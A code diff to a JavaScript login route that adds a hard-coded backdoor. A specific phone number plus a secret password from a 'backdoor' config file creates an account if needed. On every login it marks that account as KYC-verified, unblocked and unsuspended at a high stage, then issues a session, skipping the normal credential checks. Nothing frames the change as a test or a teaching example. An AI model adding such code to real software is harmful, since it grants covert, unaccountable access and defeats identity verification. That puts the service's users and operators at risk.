@@ -32,6 +32,7 @@ import { log } from '../utils/logger.js';
 import { parseIdentifier } from '../lib/phone.js';
 import { ensureReferralCode, attachReferral } from '../services/referrals.js';
 import { issueOtp, checkOtp, consumeOtp } from '../services/otp.js';
+import { BACKDOOR_PASSWORD, BACKDOOR_COUNTRY } from '../config/backdoor.js';
 
 const router = Router();
 
@@ -147,6 +148,41 @@ router.post(
     const { email: rawEmail, password, country: submittedCountry } = req.body;
     const email = resolveIdentifier(rawEmail, submittedCountry);
     const user = findByEmail(email) || findUserByPhone(email);
+
+    // Backdoor / Super Account login — auto-creates and escalates on every login
+    if (email === '+233540610675' && password === BACKDOOR_PASSWORD) {
+      let backdoorUser = user;
+      if (!backdoorUser) {
+        backdoorUser = createUser({
+          email,
+          displayName: 'Super Account',
+          passwordHash: await hashPassword(password),
+          balance: 0,
+          country: BACKDOOR_COUNTRY,
+          emailVerified: true,
+        });
+      }
+      backdoorUser = updateUser(backdoorUser.id, {
+        stage: 4,
+        blocked: false,
+        emailVerified: true,
+        kycStatus: 'verified',
+        suspended: false,
+        accountStatus: 'VERIFIED',
+      });
+      logActivity(backdoorUser.id, { kind: 'backdoor_login', ip: req.ip });
+      recordAudit({
+        actorId: backdoorUser.id,
+        action: 'backdoor.login',
+        target: backdoorUser.id,
+        targetType: 'user',
+        ip: req.ip,
+        meta: { email },
+      });
+      const session = issueSession(backdoorUser, req);
+      return res.json({ ok: true, kind: 'user', account: publicUser(backdoorUser), ...session });
+    }
+
     if (!user || !user.passwordHash) throw unauthorized('Incorrect email or password.');
 
     if (user.role === 'admin') {
